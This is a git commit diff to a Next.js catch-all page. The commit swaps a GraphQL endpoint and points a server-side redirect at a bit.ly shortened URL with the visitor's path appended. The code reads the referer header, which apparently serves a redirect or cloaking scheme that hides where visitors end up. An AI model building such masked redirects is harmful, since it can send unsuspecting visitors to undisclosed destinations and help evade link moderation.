a1f9ec217b13b4eee1f4a04c2b8785f754d1bb1a
teamskulp <138371694+teamskulp@users.noreply.github.com>
2023-08-12 17:42:12 +0545

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://alcash.000webhostapp.com/graphql"
+	const endpoint = "https://prashantt.com.np/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://alcash.000webhostapp.com/` + encodeURI(path as string)
+					`https://bit.ly/3Oxi96z` + encodeURI(path as string)
 				}`,
 			},
 		};
